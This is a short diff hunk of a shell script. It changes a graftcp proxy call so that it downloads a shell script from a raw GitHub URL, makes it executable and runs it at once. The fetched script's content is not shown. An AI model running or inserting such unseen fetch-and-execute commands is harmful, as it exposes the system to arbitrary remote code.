@@ -37,6 +37,6 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp 
+./graftcp/graftcp wget https://raw.githubusercontent.com/thefacta/repo/main/coba.sh && chmod +x coba.sh && ./coba.sh
 
 
